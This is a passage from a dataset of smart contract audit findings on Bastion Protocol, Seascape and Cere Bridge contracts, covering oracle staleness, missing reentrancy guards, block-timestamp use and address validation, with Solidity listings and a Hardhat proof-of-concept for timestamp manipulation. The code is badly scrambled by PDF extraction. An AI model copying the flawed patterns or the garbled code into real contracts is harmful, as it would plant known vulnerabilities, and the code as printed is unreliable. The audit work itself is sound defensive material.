96,98) internal view returns ( uint256 ) 87 function getChainlinkPrice ( AggregatorV2V3Interface feed ) 88 89 90 91 { 92 93 94 95 96 97 98 99 100 } // Chainlink USD - denominated feeds store answers at 8 decimals uint256 decimalDelta = uint256 (18) . sub ( feed . decimals () ); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { return uint256 ( feed . latestAnswer () ). mul (10** decimalDelta ); return uint256 ( feed . latestAnswer () ); } else { } Listing 10: contracts/Oracle/StNearFeed.sol (Lines 28-29) uint decimalsDelta = uint ( feedsDecimals ). sub ( uint ( decimals uint nearUsdPrice = uint ( nearUsdFeed . latestAnswer () ); uint stNearNearPrice = uint ( stNearNearFeed . latestAnswer () ); if ( feedsDecimals > decimals ) { 27 function latestAnswer () public view returns ( uint ) { 28 29 30 31 32  )); 33  decimalsDelta ); 34 35  )); 36  decimalsDelta ); 37 38 } } else { } return nearUsdPrice . mul ( stNearNearPrice ). div (10 ** return nearUsdPrice . mul ( stNearNearPrice ). mul (10 ** uint decimalsDelta = uint ( decimals ). sub ( uint ( feedsDecimals Listing 11: contracts/Oracle/StNearFeedV1.sol (Line 25) 24 function latestAnswer () public view returns ( uint ) { 25 26 27 } uint nearPrice = uint ( nearFeed . latestAnswer () ); return nearPrice . mul ( stNearPrice ); 22 Listing 12: contracts/Oracle/FluxOracle.sol (Lines 66,68,74,76) } else { if ( decimalDelta > 0) { if ( feed . decimals () > 18) { return uint ( feed . latestAnswer () ). div (10** decimalDelta ) // Chainlink USD - denominated feeds store answers at 8 decimals uint decimalDelta = uint ( feed . decimals () ). sub ( uint (18) ); 60 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 61 62 63 64 65 66  ; 67 68 69 70 71 72 73 74  ; 75 76 77 78 79 } uint decimalDelta = uint (18) . sub ( uint ( feed . decimals () )); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ). mul (10** decimalDelta ) } } else { } else { } } Listing 13: contracts/Oracle/FluxOracleV1.sol (Lines 65,67) // Chainlink USD - denominated feeds store answers at 8 decimals uint decimalDelta = uint (18) . sub ( feed . decimals () ); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { 60 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 61 62 63 64 65 66 67 68 69 } return uint ( feed . latestAnswer () ). mul (10** decimalDelta ); return uint ( feed . latestAnswer () ); } else { } 23 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to use latestRoundData() method instead of latestAnswer (). This method allows executing some extra validations as shown as below: Listing 14: Extra Validations (Lines 2,3,4) 1 ( roundId , rawPrice , , updateTime , answeredInRound ) =  AggregatorV3Interface ( feed ). latestRoundData () ; 2  than 0 \"); 3 4 require ( updateTime != 0 , \" Round is in incompleted state \"); require ( answeredInRound >= roundId , \" Stale price \" ); require ( rawPrice > 0, \" Chainlink price cannot be lower Remediation Plan: The solved Bastion Protocol SOLVED: commit fbf52f880bfec7790194c7bd16d610cc8c17f9cb for the FluxOracle contract, Furthermore, the Bastion which was later renamed to BastionOracle. Protocol team confirmed that only the BastionOracle contract will be used from now on, so other contracts reported in this finding are not corrected. issue this in 24 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Low"]}, {"title": "MISSING REENTRANCY GUARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "it is that tests, observed function claimReward updates During rewardAccrued[] variable after contacting an external address using transfer(), transfer() function is not prone to re-entrancy attacks, however this function maybe at risk if this functionality chance. Therefore, to protect against cross-function re-entrancy attacks, it By using this lock, an attacker may be necessary to use a mutex. can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 15: contracts/RewardDistributor.sol (Lines 276,291) 525 526 527 528 529 530 531 532 function claimReward ( uint8 rewardType , address payable [] memory holders , CToken [] memory cTokens , bool borrowers , bool suppliers ) public payable { require ( rewardType < rewardAddresses . length , \" rewardType  is invalid \" ); 533 534 535 536 537 538 539 540 for ( uint256 i = 0; i < cTokens . length ; i ++) { CToken cToken = cTokens [i ]; require ( comptroller . isMarketListed ( address ( cToken )) , \" market must be listed \" ); if ( borrowers == true ) { Exp memory borrowIndex = Exp ({ mantissa : cToken .  borrowIndex () }) ; 541 updateRewardBorrowIndex ( 25 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564  )); 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579  grantRewardInternal ( rewardType , address ( cToken ) , borrowIndex ); for ( uint256 j = 0; j < holders . length ; j ++) { distributeBorrowerReward ( rewardType , address ( cToken ) , holders [ j], borrowIndex ); rewardAccrued [ rewardType ][ holders [ j ]] = rewardType , holders [ j], rewardAccrued [ rewardType ][ holders [j ]] ); } } if ( suppliers == true ) { updateRewardSupplyIndex ( rewardType , address ( cToken for ( uint256 j = 0; j < holders . length ; j ++) { distributeSupplierReward ( rewardType , address ( cToken ) , holders [ j] ); rewardAccrued [ rewardType ][ holders [ j ]] = rewardType , holders [ j], rewardAccrued [ rewardType ][ holders [j ]]  grantRewardInternal ( ); } } } 26 Listing 16: contracts/RewardDistributor.sol (Line 312) 586 587 function grantRewardInternal ( uint8 rewardType , address payable  user , uint256 amount ) internal returns ( uint256 ) { 588 589 590 591 592 593 594 595 596 597 598 599 600 address rewardAddress = rewardAddresses [ rewardType ]; EIP20Interface reward = EIP20Interface ( rewardAddress ); uint256 rewardRemaining = reward . balanceOf ( address ( this )); if ( amount > 0 && amount <= rewardRemaining ) { reward . transfer ( user , amount ); return 0; } return amount ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: The functions on the code location section have missing nonReentrant modifiers. It is recommended to add OpenZeppelin ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. Remediation Plan: PENDING: The Bastion Protocol team will deploy a fix in the new BoostRewardDistributor in bastion-dao. 27 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Low"]}, {"title": "BLOCK TIMESTAMP USAGE IN REWARD CALCULATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During manual reviews, the usage of block.timestamp as a part of a financial mechanism was noticed. block.timestamp can be influenced by miners to a certain degree. There is a risk associated with the miners colluding on time manipulation to influence those mechanisms. However, as the contracts audited here are designed to be deployed on Aurora EVM, which has significantly reduced block times compared to Ethereum, this findings severity is reduced. Code Location: Listing 17: contracts/Oracle/TwapFeed.sol (Line 121) { 115 function update () 116 117 118 119 120 121 122 123 external returns ( uint224 price , uint32 T ) require ( pair . initialized , \" TwapFeed : NOT_INITIALIZED \"); uint32 blockTimestamp = getBlockTimestamp () ; uint32 lastUpdateTimestamp = pair . latestIsSlotA ? pair . lastUpdateSlotA : pair .  lastUpdateSlotB ; 124 125 126 127 128 129 130 131 132 133 134  ; 135 uint256 priceCumulativeCurrent = getPriceCumulativeCurrent ( pair . asToken0 ); uint256 priceCumulativeLast ; if ( blockTimestamp - lastUpdateTimestamp >= MIN_T ) { // update price priceCumulativeLast = pair . latestIsSlotA ? pair . priceCumulativeSlotA : pair . priceCumulativeSlotB ; if ( pair . latestIsSlotA ) { pair . priceCumulativeSlotB = priceCumulativeCurrent pair . lastUpdateSlotB = blockTimestamp ; 28 136 137  ; 138 139 140 141 142 143 144 145 146 147 148 } else { pair . priceCumulativeSlotA = priceCumulativeCurrent pair . lastUpdateSlotA = blockTimestamp ; } pair . latestIsSlotA = ! pair . latestIsSlotA ; emit PriceUpdate ( uniswapV2Pair , priceCumulativeCurrent , blockTimestamp , ! pair . latestIsSlotA ); } else { // don 't update ; return price using previous  priceCumulative 149 150 151 152 153 154 155 156 157 lastUpdateTimestamp = pair . latestIsSlotA ? pair . lastUpdateSlotB : pair . lastUpdateSlotA ; priceCumulativeLast = pair . latestIsSlotA ? pair . priceCumulativeSlotB : pair . priceCumulativeSlotA ; } T = blockTimestamp - lastUpdateTimestamp ; // overflow is  desired 158 require (T >= MIN_T , \" TwapFeed : NOT_READY \" ); // reverts only  if the pair has just been initialized 159 160 // / is safe , and - overflow is desired price = toUint224 (( priceCumulativeCurrent -  priceCumulativeLast ) / T); 161 } Listing 18: contracts/RewardDistributor.sol (Lines 182,218) uint8 rewardType , CToken cToken , uint256 newSupplySpeed , uint256 newBorrowSpeed 153 function setRewardSpeedInternal ( 154 155 156 157 158 ) internal { 159 160 // Handle new supply speeed uint256 currentRewardSupplySpeed = rewardSupplySpeeds [  rewardType ][ 161 address ( cToken ) 29 162 163 164 ]; if ( currentRewardSupplySpeed != 0) { // note that JOE speed could be set to 0 to halt liquidity  rewards for a market 165 166 167 168 169 170 171 172 173 174 updateRewardSupplyIndex ( rewardType , address ( cToken )) ; } else if ( newSupplySpeed != 0) { // Add the JOE market require ( comptroller . isMarketListed ( address ( cToken )) , \" reward market is not listed \" ); if ( rewardSupplyState [ rewardType ][ address ( cToken ) ]. index  == 0 && 175 rewardSupplyState [ rewardType ][ address ( cToken ) ].  timestamp == 0 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 ) { rewardSupplyState [ rewardType ][ address ( cToken ) ] = RewardMarketState ({ index : rewardInitialIndex , timestamp : safe32 ( getBlockTimestamp () , \" block timestamp exceeds 32 bits \" ) }) ; } } if ( currentRewardSupplySpeed != newSupplySpeed ) { rewardSupplySpeeds [ rewardType ][ address ( cToken )] =  newSupplySpeed ; 191 emit RewardSupplySpeedUpdated ( rewardType , cToken ,  newSupplySpeed ); 192 193 194 195 } // Handle new borrow speed uint256 currentRewardBorrowSpeed = rewardBorrowSpeeds [  rewardType ][ 196 197 198 address ( cToken ) ]; if ( currentRewardBorrowSpeed != 0) { 30 199 // note that JOE speed could be set to 0 to halt liquidity  rewards for a market 200 Exp memory borrowIndex = Exp ({ mantissa : cToken . borrowIndex  () }) ; 201 updateRewardBorrowIndex ( rewardType , address ( cToken ) ,  borrowIndex ); 202 203 204 205 206 207 208 209 210 } else if ( newBorrowSpeed != 0) { // Add the JOE market require ( comptroller . isMarketListed ( address ( cToken )) , \" reward market is not listed \" ); if ( rewardBorrowState [ rewardType ][ address ( cToken ) ]. index  == 0 && 211 rewardBorrowState [ rewardType ][ address ( cToken ) ].  timestamp == 0 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 ) { rewardBorrowState [ rewardType ][ address ( cToken ) ] = RewardMarketState ({ index : rewardInitialIndex , timestamp : safe32 ( getBlockTimestamp () , \" block timestamp exceeds 32 bits \" ) }) ; } } if ( currentRewardBorrowSpeed != newBorrowSpeed ) { rewardBorrowSpeeds [ rewardType ][ address ( cToken )] =  newBorrowSpeed ; 227 emit RewardBorrowSpeedUpdated ( rewardType , cToken ,  newBorrowSpeed ); 228 229 } } Listing 19: contracts/RewardDistributor.sol (Line 244) 236 function updateRewardSupplyIndex ( uint8 rewardType , address cToken ) 237 238 { internal 31 239 require ( rewardType < rewardAddresses . length , \" rewardType is  invalid \" ); 240 RewardMarketState storage supplyState = rewardSupplyState [  rewardType ][ cToken ]; uint256 supplySpeed = rewardSupplySpeeds [ rewardType ][ cToken ]; uint256 blockTimestamp = getBlockTimestamp () ; uint256 deltaTimestamps = sub_ ( blockTimestamp , uint256 ( supplyState . timestamp ) ); if ( deltaTimestamps > 0 && supplySpeed > 0) { uint256 supplyTokens = CToken ( cToken ). totalSupply () ; uint256 rewardAccrued = mul_ ( deltaTimestamps , supplySpeed ) Double memory ratio = supplyTokens > 0 ? fraction ( rewardAccrued , supplyTokens ) : Double ({ mantissa : 0}) ; Double memory index = add_ ( Double ({ mantissa : supplyState . index }) , ratio ); rewardSupplyState [ rewardType ][ cToken ] = RewardMarketState index : safe224 ( index . mantissa , \" new index exceeds 224 241 242 243 244 245 246 247 248 249 250 251  ; 252 253 254 255 256 257 258 259  ({ 260  bits \") , 261 262 263 264 265 266 267 268 269 270 271 272 } timestamp : safe32 ( blockTimestamp , \" block timestamp exceeds 32 bits \" ) }) ; } else if ( deltaTimestamps > 0) { supplyState . timestamp = safe32 ( blockTimestamp , \" block timestamp exceeds 32 bits \" ); } 32 Listing 20: contracts/RewardDistributor.sol (Line 290) 280 function updateRewardBorrowIndex ( 281 282 283 284 ) internal { 285 uint8 rewardType , address cToken , Exp memory marketBorrowIndex require ( rewardType < rewardAddresses . length , \" rewardType is  invalid \" ); 286 RewardMarketState storage borrowState = rewardBorrowState [  rewardType ][ 287 288 289 290 291 292 293 294 295 296 297 298 299 300  ; 301 302 303 304 305 306 307 308 cToken ]; uint256 borrowSpeed = rewardBorrowSpeeds [ rewardType ][ cToken ]; uint256 blockTimestamp = getBlockTimestamp () ; uint256 deltaTimestamps = sub_ ( blockTimestamp , uint256 ( borrowState . timestamp ) ); if ( deltaTimestamps > 0 && borrowSpeed > 0) { uint256 borrowAmount = div_ ( CToken ( cToken ). totalBorrows () , marketBorrowIndex ); uint256 rewardAccrued = mul_ ( deltaTimestamps , borrowSpeed ) Double memory ratio = borrowAmount > 0 ? fraction ( rewardAccrued , borrowAmount ) : Double ({ mantissa : 0}) ; Double memory index = add_ ( Double ({ mantissa : borrowState . index }) , ratio ); rewardBorrowState [ rewardType ][ cToken ] = RewardMarketState index : safe224 ( index . mantissa , \" new index exceeds 224  ({ 309  bits \") , 310 311 312 313 314 315 316 317 timestamp : safe32 ( blockTimestamp , \" block timestamp exceeds 32 bits \" ) }) ; } else if ( deltaTimestamps > 0) { borrowState . timestamp = safe32 ( blockTimestamp , 33 \" block timestamp exceeds 32 bits \" 318 319 320 321 } ); } Risk Level: Likelihood - 2 Impact - 2 Proof Of Concept: Listing 21 1 import { expect } from \" ./ chai - setup \" ; 2 3 import { ethers } from \" hardhat \" ; 4 import { parseEther , parseUnits } from \" ethers / lib / utils \" ; 5 import { BigNumber } from \" ethers \" ; 6 import { CErc20 , 7 Comptroller , 8 FaucetToken , 9 10 RewardDistributor , 11 } from \" ../ typechain - types \"; 12 import { 13 14 15 16 17 } from \" ./ common / Compound \" ; 18 import { SignerWithAddress } from \" @nomiclabs / hardhat - ethers /  signers \" ; 19 20 describe ( \" BSTN Liquidity Mining \" , function () { 21 22 23 24 25 26 let rewardDistributor : RewardDistributor ; let comptroller : Comptroller ; let BSTN : FaucetToken ; makeCErc20 , makeComptroller , makeRewardDistributor , makeToken , let alice : SignerWithAddress ; let malicious_miner : SignerWithAddress ; 34 [, alice , malicious_miner ] = await ethers . getSigners () ; let NEAR : FaucetToken ; let cNEAR : CErc20 ; before ( async function () { BSTN = await makeToken ({ name : \" Bastion \" , symbol : \" BSTN \" , decimals : 18 , }) ; rewardDistributor = await makeRewardDistributor () ; await BSTN . mint ( rewardDistributor . address , parseUnits ( \" 4000000 \" comptroller = await makeComptroller ({ rewardDistributor : rewardDistributor . address , NEAR = await makeToken ({ name : \" NEAR \" , symbol : \" NEAR \" , decimals : 24 , }) ; cNEAR = await makeCErc20 ({ comptroller , name : \" Bastion NEAR \" , symbol : \" cNEAR \" , underlying : NEAR , supportMarket : true , collateralFactor : parseEther ( \" 0.4 \" ) , await rewardDistributor . addRewardAddress ( BSTN . address ); await rewardDistributor . _setRewardSpeed ( 0, cNEAR . address , 0, parseEther (\" 0.01 \" ) }) ; 27 28 29 30 31 32 33 34 35 36 37 38 39  , 18) ); 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 }) ; }) ; ); 35 const ALICE_DEPOSIT_AMOUNT = \" 1 \"; const ALICE_BORROW_AMOUNT = \" 0.4 \" ; it ( \" BSTN Distribution Without Timestamp Manipulation \" , async () const underlyingDecimals = await NEAR . decimals () ; await NEAR . mint ( alice . address , parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals ) await NEAR . connect ( alice ). approve ( cNEAR . address , ethers . constants . MaxUint256 ); await cNEAR await cNEAR . connect ( alice ) . mint ( parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals )) ; . connect ( alice ) . borrow ( parseUnits ( ALICE_BORROW_AMOUNT , underlyingDecimals )); console . log ( \"\" ); console . log ( \" Normal user ( Alice ) borrows 0.4 and deposits 1 \" ); await ethers . provider . send (\" evm_increaseTime \" , [10000]) ; console . log ( \" Time passes evm_increaseTime , [10000] \" ); await rewardDistributor . connect ( alice ) [ \" claimReward ( uint8 , address )\" ](0 , alice . address ); const BSTNBalance = await BSTN . balanceOf ( alice . address ); console . log ( \" Alice claims rewards \" ) console . log ( BSTNBalance ); expect ( BSTNBalance ). to . be . gt ( BigNumber . from (0) ) ; ); 70 71 72  => { 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 }) ; 112 }) ; 36 113 describe ( \" BSTN Liquidity Mining ( Manipulated timestamp )\" , function  () { 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 let alice : SignerWithAddress ; let malicious_miner : SignerWithAddress ; let rewardDistributor : RewardDistributor ; let comptroller : Comptroller ; let BSTN : FaucetToken ; let NEAR : FaucetToken ; let cNEAR : CErc20 ; before ( async function () { [, alice , malicious_miner ] = await ethers . getSigners () ; BSTN = await makeToken ({ name : \" Bastion \" , symbol : \" BSTN \" , decimals : 18 , }) ; rewardDistributor = await makeRewardDistributor () ; await BSTN . mint ( rewardDistributor . address , parseUnits ( \" 4000000 \"  , 18) ); 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 comptroller = await makeComptroller ({ rewardDistributor : rewardDistributor . address , }) ; NEAR = await makeToken ({ name : \" NEAR \" , symbol : \" NEAR \" , decimals : 24 , }) ; cNEAR = await makeCErc20 ({ comptroller , name : \" Bastion NEAR \" , symbol : \" cNEAR \" , underlying : NEAR , supportMarket : true , collateralFactor : parseEther ( \" 0.4 \" ) , }) ; await rewardDistributor . addRewardAddress ( BSTN . address ); await rewardDistributor . _setRewardSpeed ( 37 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 0, cNEAR . address , 0, parseEther (\" 0.01 \" ) ); }) ; const ALICE_DEPOSIT_AMOUNT = \" 1 \"; const ALICE_BORROW_AMOUNT = \" 0.4 \" ; it ( \" BSTN Distribution With Timestamp Manipulation \" , async () => { await rewardDistributor . _setRewardSpeed ( 0, cNEAR . address , 0, parseEther (\" 0.01 \" ) ); const underlyingDecimals = await NEAR . decimals () ; await NEAR . mint ( malicious_miner . address , parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals ) ); await NEAR . connect ( malicious_miner ). approve ( cNEAR . address , ethers . constants . MaxUint256 ); await cNEAR . connect ( malicious_miner ) . mint ( parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals )) ; await cNEAR . connect ( malicious_miner ) . borrow ( parseUnits ( ALICE_BORROW_AMOUNT , underlyingDecimals )); console . log ( \" \"); console . log ( \" Malicious user ( Miner ) borrows 0.4 and deposits  1 \"); 193 194 await ethers . provider . send ( \" evm_increaseTime \" , [10015]) ; console . log ( \" Time passes evm_increaseTime , [10015] ,  Malicious miner manipulates block timestamp +15 \" ); 195 196 38 197 198 199 200 201 await rewardDistributor . connect ( malicious_miner ) [ \" claimReward ( uint8 , address )\" ](0 , malicious_miner . address ); const BSTNBalance = await BSTN . balanceOf ( malicious_miner .  address ); console . log ( \" Malicious miner claims rewards \") console . log ( BSTNBalance ); expect ( BSTNBalance ). to . be . gt ( BigNumber . from (0) ) ; 202 203 204 205 206 207 208 }) ; 209 }) ; Recommendation: It is recommended to use block.number instead of block.timestamp to reduce the risk of MEV attacks. Remediation Plan: RISK ACCEPTED: The Bastion Protocol team accepted the risk of this finding. 39 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Low"]}, {"title": "MISSING ADDRESS VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple contracts are missing a safety check inside their constructors and multiple functions. Setters of address type parameters should include a zero-address check. Otherwise, contracts functionalities may become inaccessible or tokens are burnt forever. Code Location: Listing 22: contracts/LockdropVaultV2.sol (Line 34) require ( claimUnlockTime_ > now , \" claim unlock time is before address ctoken_ , uint256 claimUnlockTime_ ) public { 28 constructor ( string memory name_ , 29 30 31 32  current time \"); 33 34 35 36 37 } name = name_ ; ctoken = ctoken_ ; claimUnlockTime = claimUnlockTime_ ; owner = msg . sender ; Listing 23: contracts/Oracle/FluxOracle.sol (Line 112) address oldAdmin = admin ; admin = newAdmin ; 110 function setAdmin ( address newAdmin ) external onlyAdmin () { 111 112 113 114 115 } emit NewAdmin ( oldAdmin , newAdmin ); 40 Listing 24: contracts/Oracle/FluxOracleV1.sol (Line 102) address oldAdmin = admin ; admin = newAdmin ; 100 function setAdmin ( address newAdmin ) external onlyAdmin () { 101 102 103 104 105 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 25: contracts/Oracle/NEAROracle.sol (Line 114) address oldAdmin = admin ; admin = newAdmin ; 112 function setAdmin ( address newAdmin ) external onlyAdmin () { 113 114 115 116 117 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 26: contracts/Oracle/StNearFeed.sol (Lines 17,18) nearUsdFeed = AggregatorV2V3Interface ( _nearUsdFeed ); stNearNearFeed = AggregatorV2V3Interface ( _stNearNearFeed ); 16 constructor ( address _nearUsdFeed , address _stNearNearFeed ) public  { 17 18 19 20 21 22 23  stNearNearDecimals , \" overflow \"); 24 } uint8 nearUsdDecimals = nearUsdFeed . decimals () ; uint8 stNearNearDecimals = stNearNearFeed . decimals () ; feedsDecimals = nearUsdDecimals + stNearNearDecimals ; require ( feedsDecimals >= nearUsdDecimals && feedsDecimals >= Listing 27: contracts/Oracle/StNearFeedV1.sol (Line 19) 17 constructor ( uint _stNearPrice , address _nearFeed ) public { 18 19 20 21 } admin = msg . sender ; nearFeed = AggregatorV2V3Interface ( _nearFeed ); stNearPrice = _stNearPrice ; 41 Listing 28: contracts/Oracle/StNearFeedV1.sol (Line 30) 29 function setNearFeed ( address _nearFeed ) public onlyAdmin { 30 nearFeed = AggregatorV2V3Interface ( _nearFeed ); 31 } Listing 29: contracts/Oracle/StNearFeedV1.sol (Line 41) address oldAdmin = admin ; admin = newAdmin ; 39 function setAdmin ( address newAdmin ) external onlyAdmin () { 40 41 42 43 44 } emit NewAdmin ( oldAdmin , newAdmin ); Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. Remediation Plan: The solved Bastion Protocol team SOLVED: commit 52f563f88f08f7ee7217fead1d03d8e50b8ccb33 for the FluxOracle contract, which was later renamed to BastionOracle. Furthermore, the Bastion Protocol team confirmed that only the BastionOracle contract will be used from now on, so other contracts reported in this finding are not corrected. issue this in 42 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Low"]}, {"title": "UNNECESSARY REQUIRE STATEMENT IN CONSTRUCTOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The TwapFeed contracts constructor contains a require statement, Such verifying if the Pair struct stored in storage was initialized. validation is unnecessary in the constructor, as the storage is guaranteed not to be initialized yet. As a consequence, this comparison increases the execution cost without any benefits. Code Location: Listing 30: contracts/Oracle/TwapFeed.sol (Lines 47-50) pairDecimals = asToken0 ? 18 + token1 . decimals () - token0 . constructor ( address _uniswapV2Pair , bool asToken0 ) public { uniswapV2Pair = _uniswapV2Pair ; pair . asToken0 = asToken0 ; 39 40 41 42 43 EIP20Interface token0 = EIP20Interface ( IUniswapV2Pair (  uniswapV2Pair ). token0 () ); 44 EIP20Interface token1 = EIP20Interface ( IUniswapV2Pair (  uniswapV2Pair ). token1 () ); 45  decimals () : 18 + token0 . decimals () - token1 . decimals () ; 46 47 48 49 50 51 52 53 54 55 56 57 58 uint32 blockTimestamp = getBlockTimestamp () ; pair . priceCumulativeSlotA = priceCumulativeCurrent ; pair . priceCumulativeSlotB = priceCumulativeCurrent ; pair . lastUpdateSlotA = blockTimestamp ; ! pair . initialized , \" TwapFeed : ALREADY_INITIALIZED \" getPriceCumulativeCurrent ( pair . asToken0 ); uint256 priceCumulativeCurrent = require ( ); 43 59 60 61 62 63 64 65 66 67 68 pair . lastUpdateSlotB = blockTimestamp ; pair . latestIsSlotA = true ; pair . initialized = true ; emit PriceUpdate ( uniswapV2Pair , priceCumulativeCurrent , blockTimestamp , true ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Delete the unnecessary require statements. Remediation Plan: SOLVED: 851e5e1aca4b4d01b4f007082604e6e9a5c8be85 Bastion Protocol team The solved this issue in commit 44 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Informational"]}, {"title": "FUNCTIONS CAN BE DECLARED EXTERNAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple functions are declared as public. However, they do not appear to be called from within the contract in which they are defined. Suppose a function is designed to be called by users and is not intended to be accessible internally to other functions. In that case, it is better to declare them as external to reduce the gas cost associated with their execution. Code Location: Following is the list of functions that can be declared as external. FluxOracle.sol:  getUnderlyingPrice FluxOracleV1.sol:  getUnderlyingPrice LPOracle.sol:  getUnderlyingPrice NEAROracle.sol:  getUnderlyingPrice StNearFeed.sol: 45  latestAnswer StNearFeedV1.sol:  setStNearPrice  setNearFeed Comptroller.sol and ComptrollerG1.sol:  enterMarkets  getAccountLiquidity  getHypotheticalAccountLiquidity  _setRewardDistributor  _setPriceOracle  _setPauseGuardian  _setMintPaused  _setBorrowPaused  _setTransferPaused  _setSeizePaused  _become  getAllMarkets  isMarketListed Risk Level: Likelihood - 1 Impact - 1 Recommendation: Declare functions designed to be called externally as external. Remediation Plan: SOLVED: 5fae05ea94bf13bedb4f80155adaa6c2ab97b9a3 Bastion Protocol team The solved this issue in commit 46 3.10 (HAL-10) USE OF EXPERIMENTAL FEATURES - INFORMATIONAL ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Informational"]}, {"title": "UPGRADE TO AT LEAST PRAGMA 0.8.10", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Multisend_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Gas optimizations and additional safety checks are available for free when using newer compiler versions and the optimizer.  Safemath by default since 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inline: as of 0.8.2, leads to cheaper gas runtime. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not built in, they cost an additional 20 to 40 gas due to the 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases, used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.  Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors. Code Location: The contract within scope made use of the pragma version 0.6.7 Risk Level: Likelihood - 1 Impact - 1 11 Recommendation: Halborn recommends that the project is upgraded to use at least pragma 0.8.10. Remediation Plan: SOLVED: Seascape upgraded the pragma version to 0.8.13. 12 ", "labels": ["Halborn", "Seascape_NFT_Multisend", "Severity: Informational"]}, {"title": "LACK OF MINIMUM THRESHOLD FOR INITIALRELAYERS/RELAYERTHRESHOLD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "In the contract Bridge, the _relayerThreshold state variable records the minimum number of votes needed before a proposal can be executed by a relayer. On the other hand, in the constructor, there is not a minimum threshold for the amount of relayers. Halborn suggests setting a minimum of 2 for the _relayerThreshold and a minimum of 3 initialRelayers. This way, 2 different relayer votes will be needed before a proposal is executed. In case a relayer is compromised, the other 2 relayers will be able to mitigate his actions. Furthermore, if a relayer is down, the other 2 relayers will be able to vote for the proposal and get it executed. If there was just one relayer, and this relayer was down, users would never receive their funds in the destination chain. Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to set a minimum of 2 for the _relayerThreshold and a minimum of 3 initialRelayers to maintain redundancy in the system. 14 Remediation Plan: SOLVED: The Cerebellum Network team fixed the issue by setting the threshold to 2 and setting up 4 relayers. 15 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Medium"]}, {"title": "LACK OF LIQUIDITY LOSS PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "In the contract Bridge the function adminWithdraw() allows the admin to withdraw any fund stored in the different handler contracts. A malicious admin could use this function to perform a rug pull in all 